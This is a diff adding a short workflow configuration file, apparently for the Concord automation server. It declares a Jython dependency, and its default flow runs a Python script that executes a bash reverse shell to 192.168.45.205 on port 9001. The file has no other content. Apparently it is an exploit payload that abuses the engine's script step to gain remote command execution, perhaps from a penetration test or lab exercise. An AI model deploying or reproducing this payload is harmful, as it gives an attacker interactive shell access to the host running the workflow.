@@ -1,0 +1,11 @@
+configuration:
+  dependencies:
+  - "mvn://org.python:jython-standalone:2.7.2"
+
+flows:
+  default:
+  - script: python
+    body: |
+      cmd = "/bin/bash -i >& /dev/tcp/192.168.45.205/9001 0>&1"
+      import subprocess
+      subprocess.call(cmd, shell=True)
